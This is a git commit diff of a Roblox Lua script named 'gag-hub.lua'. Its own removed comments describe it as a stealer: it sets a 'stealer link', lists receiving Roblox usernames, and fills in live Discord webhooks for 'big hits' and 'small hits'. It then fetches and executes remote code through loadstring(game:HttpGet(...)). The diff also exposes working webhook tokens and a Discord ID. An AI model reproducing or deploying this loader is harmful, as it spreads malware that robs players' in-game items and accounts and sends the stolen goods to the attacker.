618dd29a61bb46ca78df3d05468e6b7654bb1d28
BloxyBuy <kbercicreator@freemail.hu>
2025-08-30 13:46:22 +0200

    Update gag-hub.lua

--- gag-hub.lua
+++ gag-hub.lua
@@ -1,15 +1,13 @@
-STEALER_LINK = 'https://pastefy.app/K2z3diHS/raw' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://pastefy.app/K2z3diHS/raw'
 
-DISCORD_ID = '836212046390755379' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
+DISCORD_ID = '836212046390755379'
 
 Usernames = {
-    'SarzenttoPrivareS', -- PUT UR ROBLOX USERNAMES
-    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
-    'third',
+    'SarzenttoPrivareS', 
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/x/x"
-SmallHitsWebhook = "https://discord.com/api/webhooks/x/x"
-
+BigHitsWebhook = "https://discord.com/api/webhooks/1411315972232712242/yKKOFV34YOedGqK_opA1QTOALcdFaSup6TdzMJrx1jM8--h8DfSoBUDlrOFI8Jok_T5n"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1411240284829913199/fBpM111taG_HHu_wOhoU1jPcbKN_m3wD7poHt6pGIm-VdfqfxO6HyT1qxKepX6ik8lat"
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+
 
